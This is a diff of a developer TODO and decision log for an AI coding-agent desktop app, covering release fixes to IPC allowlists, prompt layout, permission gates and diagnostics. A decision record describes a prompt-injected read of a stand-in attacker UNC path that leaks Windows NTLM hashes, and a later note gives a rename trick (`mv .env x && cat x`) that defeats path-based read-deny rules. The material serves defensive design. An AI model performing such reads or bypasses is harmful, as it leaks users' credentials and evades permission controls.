@@ -1,11 +1,15 @@
 # Atlarix TODO
 
-**Current version:** v14.35.0 — **RELEASED 2026-08-20** (12 assets, `/releases/latest` verified).
+**Current version:** v14.36.0 — **RELEASING 2026-08-22**. Diagnostics panel + `--doctor`, the
+database dead-end, per-session work mode, cold-chat eviction, debug routed like build, the memory
+location at the top of the prompt, three missing preload channels, and the dead
+`write_multiple_files` cluster removed.
+**Previous:** v14.35.0 — RELEASED 2026-08-20 (12 assets, `/releases/latest` verified).
 Electron 43, browser-backed web search, the
 spec-line majors, 54 → 28 advisories, the Dyad-era removal (~30,500 lines), plan switcher +
 plan-by-title, automations returning their id, the ban system, the whisper-worker CSP, and four
 plan-tracking fixes.
-**Last updated:** 2026-08-20
+**Last updated:** 2026-08-22
 
 > **What belongs here:** open work, decisions still owed, and traps worth not rediscovering.
 > **What does not:** shipped narrative → [`CHANGELOG.md`](./CHANGELOG.md). Design prose →
@@ -20,9 +24,247 @@ plan-tracking fixes.
 
 ---
 
+## 🚀 Shipped in v14.36.0 (2026-08-22)
+
+> One batch: the Skills paywall fix, three defects and two decisions from reading the latest
+> `claude-code` / `opencode` / `codex` tags against our own source, the Diagnostics panel, and — added
+> last, on the owner's call — debug routed like build. The packaged app was exercised by hand before
+> tagging. Still owed: the session-load diagnostic numbers (below).
+
+> **Not doing: a UNC/non-local path guard on the file tools.** Built 2026-08-21 and removed the same
+> day on the owner's call. The finding was real — `read_file` auto-allows any absolute path with no
+> approval card, and `path.isAbsolute` is **true** for `\\host\share\x` on Windows, so an injected
+> read of `\\attacker.example\share\x` makes Windows authenticate outbound over SMB and hand over the
+> machine's NTLM hash. What it is NOT is complete: `run_command` can still `type \\host\share\x`,
+> network is on in every mode, and closing that needs the sandbox — which on Windows is Low IL,
+> `NO_WRITE_UP`, so reads up are permitted by design. **Weighed against:** Windows-only, needs an
+> attacker-reachable SMB host, and many networks block 445 outbound. Claude Code ships this guard
+> (v2.1.234, naming the vector); **opencode does not** — its only UNC handling is case-normalisation
+> for display paths. The pre-existing rejection on the RELATIVE branch of
+> `safeRelativePathUnderWorkspace` was never touched and still stands; only the absolute branch is
+> unguarded. Re-open this if a Windows user is ever seen reading a network path, or if the sandbox
+> gains a read-deny layer that could cover both tools at once.
+
+- **Three IPC channels were unreachable from the renderer, one of them a live bug.** `preload.ts`
+  gates `invoke` on `validInvokeChannels` and throws `Invalid channel: <name>`; registering the
+  handler in `ipc_host` is NOT enough, and nothing before runtime notices. Caught by opening the
+  packaged app: `doctor:run` failed loudly, and **`sessions:set-work-mode` would have failed
+  SILENTLY** — its caller catches and logs a warning, so the per-session work mode simply would not
+  have persisted. A new test (`preload-invoke-channels.test.ts`) asserts the whole surface
+  mechanically, and it immediately found a **pre-existing** one:
+  **`sessions:snapshot-turn-ids` was never allowlisted**, and its caller
+  (`SimpleInlineChat.tsx:148`) swallows errors — so the revert-turn affordance has never rehydrated
+  after a relaunch, which is the exact thing its own "Bug 6" comment says it was added to fix.
+  **The test needed two fixes before it could be trusted** (~20 false positives on the first run):
+  strip comments BEFORE matching quotes, because an apostrophe in a trailing `//` comment
+  desynchronises quote-pairing for every entry after it; and scan only files that use the preload
+  bridge, because main-process files call `invoke(` too and never pass through this gate.
+  `get-node-path`, `compass:get-tier-catalog` and the four `ssh:*` channels are `IpcClient` methods
+  with **no renderer caller** — left OUT of the allowlist deliberately (allowlisting a channel to
+  quieten a test grants reach to something nobody can use) and listed as known-unreachable, with a
+  guard that fires if one is ever allowlisted.
+  **The standing rule: a new IPC channel is TWO edits** — the handler and the preload allowlist.
+- **The memory store's location now opens the system prompt.** A DeepSeek V4 Pro session on
+  `wisdom-drop` spent ~15 tool calls running `find` for `MEMORY.md`, then answered from a **stale
+  hand-made backup** (`~/.atlarix-memory-backup-2026-08-19/`, content differs from live) — with the
+  resolved path in its context the whole time. Proven from the logs for that turn: `memory-index=6ms
+  memory-compaction=0ms`, and compaction only runs in the POPULATED branch, so the path and the index
+  were both there. **Position was the problem, not wording.** Measured: the identity block sat FIFTH
+  in `stableHeader`, putting the memory line 94% of the way through a 14,428-character header —
+  orienting information arriving after all the procedure.
+  `buildWorkstationIdentityBlock` now takes `memoryDir` and states it as **the only** store, and
+  `runtimeIdentity` moved to position ONE. The line now sits at 4.6% (char 667); the header is the
+  same length, so this is a pure reorder costing one cache-prefix invalidation and nothing after.
+  **NOT AGENTS.md, though that is what was asked for** — `AGENTS_MD` is loaded once at startup and
+  returned verbatim (`system_prompt.ts:114`), one global string for every workspace, so a
+  per-workspace path could only go in as a `<slug>` placeholder: *the exact fillable-path bug that
+  caused the stale-copy incident*. The identity block was already a per-dispatch template, so this
+  needed no new mechanism.
+  **PATH ONLY, never the note count** — the block is the prompt-cache prefix, same discipline that
+  keeps `freemem()` out of the device line while cores and total RAM stay in. Count and index remain
+  in the per-turn section.
+  **This DELETED the empty-state branch** whose entire justification was being "the only place the
+  absolute memory path is published" — an empty workspace now pays nothing per turn. Its test file
+  survives, re-pointed at the guarantee (absolute path, never a guess, never a placeholder) rather
+  than the mechanism, and renamed `memory-location-is-published.test.ts`.
+  **Still unproven:** whether it changes the model's behaviour. The measurable check is re-running the
+  same prompt on `wisdom-drop` and comparing tool-call count against the logged ~15. If it still
+  hunts, placement was not the answer and the honest next step is a memory TOOL, not more prompt.
+- **Debug is routed like build, not like ask.** The turn-runner selector read
+  `settings.selectedChatMode === "ask"`, and `chatModeForWorkMode` maps everything except `build` to
+  "ask" — so debug ran the ask branch with `singleRound: true`, keeping the SDK's inner multi-step
+  loop but losing the OUTER agentic loop and the completion gates. Three places said that was wrong:
+  `mode-tool-registry` ("debug = full surface, differs from build by prompt discipline only"),
+  `isReadOnlyWorkMode` (debug is not read-only), and `run-agent-turn`'s "Build/debug: run the
+  completion gates before ending". Fixed in the SELECTOR (`isReadOnlyWorkMode(effectiveWorkMode)`),
+  not the mapping: anyone already on Debug has `selectedChatMode: "ask"` persisted, so a mapping-only
+  fix would have done nothing for existing users — and the real question is "is this mode read-only?",
+  which removes a proxy and leaves one source of truth. Verified low blast radius: `chatMode` is
+  destructured as `_chatMode` (**unused**) in `constructSystemPromptParts`, so it drives no prompt
+  content, and every other reader uses it for display or as a fallback.
+  **The test method is the reusable part.** Request counts were tried first and were USELESS — ask and
+  build both made 2 on the same scenario, so counting would have passed either way. Diffing the two
+  branches' IPC channels found the real discriminator: only the build branch emits
+  `chat:iteration:progress`, which IS the outer loop. The eval asserts comparatively (debug matches
+  build, differs from ask) behind a sanity guard that fails if the signal ever stops separating them.
+- **The memory location moved to the top of the prompt, in every mode.** See the reference-sweep and
+  verification sections; the ask-branch half of it was found only by asserting against the DISPATCHED
+  prompt rather than a hand-supplied argument — four of the five work modes were missing it.
+- **A failed database open is no longer a dead end.** It showed "Database Error … Please restart the
+  app" and quit — advice that is wrong for **every** case that can reach it, because
+  `initializeDatabase` already retries once and DELETES the sqlite files before retrying. The one
+  thing a restart could accomplish has already been tried automatically. `describeDatabaseInitFailure`
+  now classifies the cause and `showMessageBoxSync` carries actions (Download / Show logs / Quit).
+  **The branch that matters is the DOWNGRADE one** (`UnknownDrizzleMigrationHashError`): their data is
+  newer than the app and perfectly healthy, so it must never be told to reinstall over it or delete
+  anything — and it is matched by CLASS before any message pattern, because its own message contains
+  "would corrupt DB", which a text-first classifier reads as a reason to wipe. The raw error stays in
+  the dialog; classification adds a headline, it does not replace the detail. Title is "Atlarix can't
+  start", not "Database Error" — the old one named our internals rather than the user's situation.
+  Deliberately NOT wired in: the existing `reset-all` recovery, because a destructive button in an
+  unexpected modal is worse than revealing the folder.
+- **One floating promise stops paging the owner.** `main.ts`'s `browser-window-focus` handler called
+  `broadcastWorkspacePathStatusesIfChanged()` (which reads the `apps` table) through a `void
+  import().then()` with no `.catch` anywhere in the chain. Focus events keep arriving while the app
+  tears down, so `DatabaseClosingError` escaped as an unhandled rejection and reached Sentry as
+  `handled = no`. Fixed at the CALLER, matching its three sibling boot tasks — the guard in
+  `db/index.ts` is right. The catch matches on `err.name` (it crosses a dynamic-import boundary), so
+  `db-closing-guard.test.ts` now pins that name as contract: a rename would not break the build, it
+  would silently downgrade the branch and the noise would return.
+- **The retired tool names are out of the permission path.** Measured before touching anything:
+  `edit_file` is emitted at **26** live sites, and `write_file`, `replace_code`, `insert_code`,
+  `delete_lines`, `edit_file_section`, `batch_refactor` at **zero**. Removed from the operation-keyed
+  gates (the interceptor's two switches, `FILE_OPS_WITH_SCOPE`, `CONTENT_WRITE_OPS`, the zod enum, the
+  renderer union, and the `write_file || edit_file` pairs in the turn-runners) by dropping them from
+  the type unions first and letting `tsc` enumerate all 13 sites. **Display entries KEPT** —
+  `tool-activity-labels`, `tool-expand-view`, `stream-tool-display` and friends still render sessions
+  persisted before v13.8.
+  **Two things this FIXED rather than tidied.** `operation-targets.ts` ended `default: break`,
+  returning no targets — and per that file's own header, a path missing from the list is a path that
+  is never gated, so an unrecognized operation sailed through containment. It now fails CLOSED, which
+  is what made removing the dead labels safe rather than a fail-open change. And
+  `permissions/ruleset.ts` documented the deny-rule format as `write_file(.env*)`, so anyone copying
+  our own example into `.atlarix/permissions.json` wrote a rule matching nothing.
+  **Not done, deliberately:** collapsing the surviving sets into one shared constant. They are not the
+  same set — `FILE_OPS_WITH_SCOPE` is {edit_file, delete_file, rename_file}, `CONTENT_WRITE_OPS` is
+  {edit_file} — and merging two different questions to save a line would be worse than the repetition.
+  The tool-name-keyed lists (`task-ledger`, `agentic-loop-repetition`, `useStreamChat`) were checked
+  and LEFT: they match live tool names, so their stale entries are inert either way, and touching them
+  buys nothing.
+- **A provider error delivered as a successful finish no longer truncates a turn in silence.** A
+  gateway can answer HTTP 200 with a clean stream whose `finish_reason` is `network_error`; nothing
+  threw, so the silent retry never armed, and `run-agent-turn` read the mapped "unknown" as the model
+  yielding. `stream_chunk_tags` now throws `ProviderFinishReasonError` on an error-shaped
+  `rawFinishReason` (a field we never read) at BOTH the `finish-step` and `finish` seams — a one-step
+  round reports only `finish`, so guarding the step alone would miss the common short-answer shape —
+  and the existing jittered backoff does the rest. The classifier is a DENY list on error vocabulary,
+  never an allow list of good values: a false positive would retry a completed answer and re-run its
+  tools. `length` and `content_filter` are deliberately excluded.
+- **The dead `write_multiple_files` permission cluster is gone.** No tool has emitted that operation
+  since `write_file` folded into `edit_file`, and the only construction site bypassed buffering, so
+  the card could never render. Had it rendered it would have shown ONE file's diff while approving
+  every write in the batch, and "Always allow this file" would have saved nothing at all
+  (`handlers.ts` read `.path` off an array preview). Removed the live path; **kept** the
+  display-label / expand-view / stream-display entries, because sessions persisted before the removal
+  still render cards under that name. The two array-preview branches in `operation-targets` and
+  `extractRelativePathsFromPreview` **stay, re-keyed on SHAPE** — they feed containment checks, and an
+  unrecognized array falling through would extract no targets, which fails OPEN.
+- **Work mode belongs to the session** (`chat_sessions.work_mode`, migration 0074). The picker wrote
+  a global, so reopening a session you were planning in from a window set to Build silently made the
+  next turn a Build turn. Legacy rows stay NULL and keep resolving from the global preference; the
+  first deliberate pick in a session stamps it. Every send now passes `workModeOverride`, so main
+  never re-reads a global for a per-session decision — **but only when the turn's session IS the
+  active one**, or a background chat would inherit the mode of whatever is on screen, which is the
+  same bug in a new place. `drizzle-kit` bumped 0.30.6 → 0.31.10 first, as the queue required.
+- **A cold chat's renderer state is now freed.** The view was windowed; the data behind it was not.
+  Cold = **not the visually-active chat AND not streaming** — an open tab does not protect it.
+  `useEvictColdChatState` (mounted once in the layout) prunes on deactivation via
+  `clearChatAtomsForChat(id, {reason:"evicted"})`, which now also drops the `atomFamily` entries
+  (they cache one wrapper atom per key for ever, one per MESSAGE id being the larger leak).
+  **The blocker first:** `ChatTabStrip.switchToTab` only flipped ids, so the atoms were the only copy
+  of a background session's history — activation had to become re-loadable before anything could be
+  freed, which is why the session load now lives in `hydrate-session-into-chat.ts` and the tab strip
+  calls it. **Eviction is tracked explicitly** (`evictedChatIdsAtom`) rather than inferred from
+  "are the messages there": a background stream repopulates messages by itself (main sends the whole
+  list per chunk) but nothing rebuilds the per-message display atoms, so a streamed evicted chat would
+  come back looking complete and render its earlier turns stripped of their tool cards.
+  **Found while testing:** `interleavedDisplayContentByMessageIdAtom` was missing from the original
+  v12 pruner, so it leaked on session DELETE too — and it holds the fully rendered body of every
+  assistant turn.
+- **Settings → Diagnostics** (the doctor), plus `--doctor` from a terminal. Reuses the self-test's
+  `SelfTestProbe` contract and `runSelfTest` — the native and sandbox rows ARE its probes, imported,
+  not reimplemented — with a 12s budget instead of 45s, and `child-exec` / `fs-outside-container`
+  excluded as inappropriate in front of a user. Updates are NOT a probe: `UpdateDiagnostics` already
+  owned that surface and is rendered inside the section rather than duplicated as a row that could
+  disagree with it. Keys are checked with a models-list call, **never a completion**, so running a
+  diagnostic cannot cost the user money. Copy-report redaction lives in main with its own tests and is
+  **shape-based, not a list of known prefixes** — the first provider to ship a new key format would
+  otherwise leak it. `--doctor` waits for `whenReady` (unlike `--self-test`, because `safeStorage`
+  needs it), takes no single-instance lock, opens no window, and exits with `app.exit()`.
+  **Why the CLI exists:** a DB init failure shows a modal and QUITS, so Settings is unreachable in
+  exactly the case you most need a diagnostic — which is also why the keys row reports "the local
+  database is unavailable" instead of surfacing a native ABI error under a row about API keys.
+- **Clicking Skills on Free no longer opens a checkout.** `SettingsPage`'s `SkillsCard` intercepted
+  its own click and called `triggerUpgrade()`, which opens the Lemon Squeezy page in the system
+  browser — so a Free user who tapped a settings row was thrown out of the app into a payment page
+  having asked for nothing. It now navigates to `/settings/skills` on every tier and the page states
+  the tier, exactly as `McpMarketplaceTab` does. **The rule:** a navigation affordance navigates;
+  only a button that says Upgrade may open a checkout. Two other `triggerUpgrade()` call sites are
+  correct (the sidebar's explicit Upgrade button, `ChatErrorBox`'s upgrade CTA);
+  **`open-workspace.ts:43` is the same anti-pattern** — opening a second workspace on Free launches
+  the checkout — left alone because a workspace limit has no page to land on, but it deserves a
+  dialog rather than a browser tab.
+
+## 🔬 Reference sweep — read 2026-08-21, all of it landed
+
+Read against `claude-code` **v2.1.238**, `opencode` **dev @ 57fa34f2** (v1.18.20) and
+`openai/codex` **rust-v0.149.0**, all 2026-08-20. Every item was checked against OUR code before it
+was written down, and everything below is now implemented — see the Unreleased section above for
+what each one was. Kept here only for the standing lesson each one carries:
+
+- **A changelog line from another harness is a QUERY, not a task.** Three of ~40 candidate lines
+  turned out to describe real defects here; the rest did not apply, and one (opencode having to learn
+  that `finish: "unknown"` must not end the loop) we already handled better. Read their fix, then go
+  looking in your own source — do not port the fix.
+- **Check reachability before repairing.** The multi-file approval card was a genuine grant/display
+  mismatch AND unreachable, so the correct response was deletion, not a fix. `git grep` finds
+  presence; tracing the producers finds reachability.
+- **An error can arrive as a success.** A 200 response, a well-formed stream, and `finish_reason:
+  "network_error"` — nothing throws, so every retry path stays disarmed and the turn truncates in
+  silence. When a provider hands you a field you never read, ask what it can say.
+- **Windows path spellings are a security surface, not a formatting detail.** `path.isAbsolute` is
+  `true` for `\\host\share` on Windows, and the relative branch has rejected UNC for years while the
+  absolute branch — the spelling an attacker would use — does not. The guard written for this was
+  removed on the owner's call (see the decision record above); the observation stands, and any future
+  read-deny work inherits it.
+
 ## ✅ Verification owed — code done, no code expected
 
 These are trips and clicks, not tasks. Each fix is already shipped.
+
+- [ ] **Does the memory move actually change behaviour?** Re-run the same "how've you been / what's in
+      memory" prompt on `wisdom-drop` with DeepSeek V4 Pro and count tool calls. Baseline is the
+      logged session: ~15 calls, ending on a stale backup. A pass is reading the store directly. **If
+      it still hunts, placement was not the answer** — the honest next step is a memory tool, not more
+      prompt, and this item should say so rather than being quietly ticked.
+      Note `~/.atlarix-memory-backup-2026-08-19/` is a HAND-MADE copy (nothing in our source creates
+      it) whose content differs from live; it will keep winning `find` races while it sits in `~`, so
+      move it before drawing conclusions from a re-run.
+
+- [ ] **The unreleased batch, in the PACKAGED app** (never the dev server): two sessions with
+      different modes following their own session; switching away from a large session and back with
+      no empty chat; a turn in A surviving a switch to B; every Diagnostics row rendering,
+      "Copy report" carrying no key material, and `--doctor` exiting.
+      **This machine cannot do it as-is:** the root `better_sqlite3.node` is dated Jun 15 and was
+      never rebuilt for Electron 43, so a raw `npx electron .` dies with
+      `NODE_MODULE_VERSION 141` vs `148`. `npm start` / packaging runs Forge's electron-rebuild and
+      heals it — but that also means a raw-binary launch is not a valid way to test anything here.
+- [ ] **The session-load numbers** — `ATLARIX_DIAG_SESSION_LOAD=1` (main) +
+      `localStorage["atlarix:diag:session-load"]="1"` (renderer) on the 1.43M-token session, four
+      numbers recorded. NOT closed by the cold-chat eviction that shipped: eviction frees memory
+      AFTER the fact and cannot make the first `parseDisplaySnapshot` cheaper. Whether the parse or
+      the main→renderer transfer dominates is what decides where laziness goes, and it is a
+      measurement, not a guess.
 
 - [ ] **Anthropic extended thinking — BELIEVED fixed, not OBSERVED fixed.** The capability branch,
       the SDK-shaped `budgetTokens` and the temperature omission are covered by 12 tests (verified
@@ -54,10 +296,21 @@ These are trips and clicks, not tasks. Each fix is already shipped.
 **Every fix below is ALREADY SHIPPED.** This is a verification checklist. Counting it as a backlog is
 what made this queue read three times its real size.
 
-- [ ] **Electron 43** — `self-test:packaged` reporting **9 probes** including the new `sqlite` one
-      (the only genuinely ABI-pinned module, and the one nothing used to cover), and a passkey site
-      showing the notice instead of hanging. The upgrade does **not** revalidate the sandbox helpers —
-      standalone Rust binaries, no Node ABI coupling — but they need this machine anyway, below.
+> **The migration itself is VERIFIED (2026-08-21).** A full end-to-end pass ran on **Windows and
+> Linux** against the packaged v14.35.0 build and the app works: it installs, launches, and runs a
+> real turn after the Electron 43 upgrade and the AI-SDK spec-line majors. That closes the question
+> the migration actually raised — whether a native ABI or a provider spec change broke a platform no
+> one develops on — and it is the first time both platforms have been confirmed on a release of this
+> size. What survives below is not "does it run" but the individual behaviours whose only evidence is
+> a specific log line or a specific click, which a smoke pass does not produce. Tick them as they are
+> observed rather than assuming this pass covered them.
+
+- [x] **Electron 43** — verified 2026-08-21 on Windows and Linux: the packaged app runs after the
+      upgrade. Still worth capturing if you are back on the machine anyway:
+      `self-test:packaged` reporting **9 probes** including the new `sqlite` one (the only genuinely
+      ABI-pinned module, and the one nothing used to cover). The upgrade does **not** revalidate the
+      sandbox helpers — standalone Rust binaries, no Node ABI coupling — but they need this machine
+      anyway, below.
 - [ ] **Passkey notice ACCURACY** — it must **not** appear for a request that explicitly asks for a
       roaming authenticator, because a security key or a phone over hybrid/QR works on every
       platform. Verify one actually does.
@@ -65,13 +318,12 @@ what made this queue read three times its real size.
       that is the whole point. Confirm an **info**-level `Sandboxing run_command` line (it was
       `debug`, so only failure was ever visible). `CreateProcessAsUserW` must succeed unprivileged —
       `ERROR_PRIVILEGE_NOT_HELD (1314)` means commands run unconfined, and then implement Codex's model.
-- [ ] **Process-tree kill (v14.32.0)** — `taskkill /pid <pid> /T /F`. Reasoned from documented
-      behaviour, not observed; the real-process test is skipped on Windows. Start a dev server through
-      `run_command`, cancel it, confirm no node process survives and the port is free.
-- [ ] **On-device voice (v14.30.0)** — dictate and read `%APPDATA%\Atlarix\logs\main.log`:
-      `dtype=q4`, then `device=webgpu` **or** `device=wasm` — either is a pass, and `wasm` is the
-      valuable one because that is the path that was broken. Must NOT appear: `MatMulNBits`,
-      `Missing required scale`, `stopped downloading`. ~285 MB, mic clickable while downloading.
+- [x] **Process-tree kill (v14.32.0)** — VERIFIED by the owner on Windows and Linux, 2026-08-21.
+      `taskkill /pid <pid> /T /F` reaps the tree; it was previously reasoned from documented behaviour
+      only, with the real-process test skipped on Windows.
+- [x] **On-device voice (v14.30.0)** — VERIFIED by the owner on Windows and Linux, 2026-08-21.
+      Dictation works after the q4 fix, which closes the item the v14.30.0 release opened with
+      "Windows+Linux runtime verification still owed".
 - [ ] **MSIX §4 behaviour check** (`MSIX_RUNBOOK.md`) — **baseline on Squirrel FIRST**, or a failure
       inside MSIX is unattributable. Plus: the manifest protocol declaration works for OAuth, and
       `atlarix://pro-return` completes a Lemon Squeezy purchase. Not to be confused with the packaging
@@ -96,9 +348,14 @@ what made this queue read three times its real size.
   "non-fatal"; one leaves a floating promise, so it reaches Sentry as `handled = no` and pages the
   owner. The guard is right; one boot task needs a `.catch`. Any user who quits during startup can
   hit it.
-- **Local packaged builds report `environment=production` to Sentry**, so a developer machine fires
-  production alerts. `app.isPackaged` is true for a local ad-hoc build, so it is the wrong
-  discriminator. Gate the DSN on a CI-injected marker or the signing identity instead.
+- **Local packaged builds report `environment=production` to Sentry — KEEP, decided 2026-08-22.**
+  `app.isPackaged` is true for a local ad-hoc build, so a developer machine reports as production.
+  That was filed here as a defect with a fix attached (gate the DSN on a CI marker or the signing
+  identity); the owner's call is to leave it, because local packaged builds are a deliberate
+  diagnostic channel — some bugs are only findable through Sentry, and separating the environment
+  would put exactly those runs where nobody looks. **This is settled, not pending.** The cost is
+  accepted: production alert counts include the owner's own machine, so never read alert VOLUME as a
+  user-impact signal without checking the source first.
 - **`useAuth` is an UNSHARED hook with ~22 consumers**, each running its own `checkSession()` —
   still the cause of repeated "Enforcing workspace limit" logs. Guard in the IPC handler, never in
   the hook. **The sign-out half is now scoped:** `SubscriptionManager.signOut()` does not broadcast
@@ -148,6 +405,24 @@ what made this queue read three times its real size.
 
 ## 🧭 Designed — awaiting a session
 
+- **Streaming "jumps" are LAYOUT, not pacing — do not touch the pacer.** Reported as "smooth then
+  jumped then smooth", and narrowed with the owner to "the tools & some reads & thoughts".
+  `useSmoothStreamedContent` is **already adaptive**: `rate = min(MAX_CPS, BASE_CPS + backlog /
+  CATCHUP_SECONDS)`, where the backlog term self-tunes to the provider's real arrival rate with no
+  per-provider knowledge — which its docblock rejects deliberately, since with 4,400+ models such a
+  table is wrong the day a provider changes infrastructure. The "~50 ms" is the renderer's flush
+  interval UPSTREAM of the pacer, not a pacing knob. **Nothing there needs to become dynamic; it
+  already is, and tuning those constants cannot fix what is being seen.**
+  What is actually unpaced: the pacer has ONE consumer (`AssistantMessageBody.tsx:115`, assistant
+  prose). Tool activity renders through `StreamThreadItemView` as cards inserted at full height — a
+  layout insertion no reveal rate can smooth. And `InlineThoughtBlock` auto-collapses when streaming
+  ends (`if (!isStreaming && !keepOpenAfterStream) setOpen(false)`), so everything below jumps up:
+  **the single best match for smooth → jumped → smooth, and the place to start.**
+  Candidate fixes are reserved height / transition on insert, and not collapsing while content is
+  still arriving below. This is the most reflow-sensitive code in the renderer — it already produced
+  one "scratchy rendering" regression — so do it with the packaged app open.
+
+
 - **QA sub-agents, remaining half.** Shipped as a role. Still owed: **measure contract drift** —
   script a weak model over a multi-item coverage contract in `tests/agent-evals` and count dropped
   items. That number, not reasoning, decides whether a validated structured return is ever built.
@@ -164,8 +439,15 @@ what made this queue read three times its real size.
   exists and cannot paint because nothing yields.
 - **Configurable read-deny patterns, opencode-style** — user-declared only, no defaults; chosen over
   Codex's model because it keeps `lib/tools/glob.ts:221` intact (the deliberate decision that
-  in-workspace files, `.env` included, are enumerable). **The caveat dominates the estimate:** a
-  deny-read is only real if `run_command` cannot `cat` the file. macOS Seatbelt and Linux Landlock
+  in-workspace files, `.env` included, are enumerable).
+  **Take Claude Code v2.1.236's SEMANTICS — they are the hard part, and they are now shipped
+  upstream:** a wildcard deny (`**/.env`) takes **precedence inside allowed read regions**, covers a
+  matched **directory's contents**, and **cannot be bypassed by renaming** the denied file. That last
+  one is the trap: a deny evaluated on the path as written is defeated by `mv .env x && cat x`, so it
+  has to be enforced on the RESOLVED target. (The non-local-root guard added 2026-08-21 sits in
+  `resolveToolTargetPath`, which is the same choke point this would use.)
+  **The caveat dominates the estimate:** a deny-read is only real if `run_command` cannot `cat` the
+  file. macOS Seatbelt and Linux Landlock
   are cheap; **Windows Low IL cannot** — MIC is `NO_WRITE_UP`, so reads up are allowed by design, and
   the AppContainer that *could* deny reads is exactly why it broke. Scope as tool-level everywhere +
   sandbox-level on macOS/Linux + a documented Windows gap.
@@ -392,6 +674,34 @@ wrong.
 
 Grouped by where they bite. Each is the one sentence that would have saved the time; the long form is
 in `git log -- docs/TODO.md` and `CHANGELOG.md`.
+
+### Testing, and tests that pass for the wrong reason
+
+- **A source-parsing test must be debugged before it is believed.** The preload-allowlist checker
+  reported ~20 missing channels on its first run and every one was a false positive: an apostrophe in
+  a `//` comment broke quote-pairing, and it was scanning main-process files that never touch the
+  bridge. The instinct on a red mechanical check is to start "fixing" the product — verify the
+  CHECKER first, on a case you know to be fine (here: the update buttons visibly worked).
+
+- **A test that passes with the fix REVERTED is not a test.** Found on a path guard (since removed):
+  its first tests all passed WITHOUT the guard, because on macOS a `\\host\share` path is not
+  `isAbsolute` and fell through to a different branch that already rejected it. Measured, not assumed
+  — the guard was commented out and the suite re-run. Where two branches can produce the same refusal,
+  assert the WORDING, since that is the only thing identifying which one fired. **Any cross-platform
+  guard written on a dev machine deserves this check**, and it cost nothing here: comment out, re-run,
+  restore.
+- **Prefer one unconditional rule over a per-platform one.** A `process.platform` branch needs a
+  platform parameter to be testable at all, doubles the matrix, and leaves the same input behaving
+  differently per platform — which an agent then learns wrong. If rejecting more costs nothing real,
+  reject unconditionally and delete the branch.
+- **Shared jotai default store leaks between tests.** `clearChatAtomsForChat` writes to
+  `getDefaultStore()`, so an eviction recorded in one test was still set in the next and two
+  assertions passed for the wrong reason. Reset every atom the code under test writes, not just the
+  ones the test seeds.
+- **`npx electron .` runs the STALE compiled bundle and skips Forge's native rebuild.** It is not a
+  way to test a source change: it dies with `NODE_MODULE_VERSION` mismatch on a repo whose
+  `better_sqlite3.node` predates the current Electron, and it silently ignores any new CLI flag. Use
+  `npm start`, or the packaged app.
 
 ### Packaging, signing and native modules
 
@@ -646,6 +956,7 @@ the traps themselves are consolidated above.
 
 | Version | Shipped | Trap |
 | --- | --- | --- |
+| **v14.36.0** | Diagnostics panel + `--doctor`; the database dead-end; per-session work mode; cold-chat eviction; debug routed like build; memory location at the top of the prompt | A new IPC channel is TWO edits — handler AND preload allowlist; three were missing and one (`sessions:snapshot-turn-ids`) was a live pre-existing bug behind a silent `catch {}`. A test that supplies the argument itself proves nothing about whether production passes it: four of five work modes lacked the memory path. Request counts did not distinguish the ask and build runners — diffing IPC channels did. `operation-targets` ended `default: break`, so an unknown operation was gated against nothing. |
 | **v14.35.0** | Electron 43, Touch ID passkeys, browser-backed web search, the spec-line majors, 54 → 28 advisories, the Dyad-era removal, the ban system, four plan-tracking fixes | Two silent macOS packaging traps (SIGTRAP 133, SIGKILL 137). `response.messages` became final-step-only. A stale `CREATE OR REPLACE` body nearly broke every client write to `users`. A NUL byte makes ripgrep skip a file. `created_at` is whole seconds. The plan ledger went stale at the **round** boundary, not the step boundary — `run-agent-turn` restarts `stepNumber` at 0 per round, so a take-once queue was already drained. Measured web search: 24/29/25 results where DDG and five public SearxNG instances returned 0/0/0. |
 | **v14.34.0** | Atlarix tests its own work; two windows stop fighting over one mode | A per-window decision made from GLOBAL settings put a Build turn in a read-only sandbox, across five sites, triggered by an effect on window open. Truncation was discarding 99% of its own budget and reordering. Sub-agents had **no way to ask**, which read as safety and was why they could not run commands. |
 | **v14.33.0** | automations that tell the agent; `operation:"run"` | Published ≠ latest, and `curl -sS` exits 0 on an HTTP error. **Verify the artefact users reach.** |
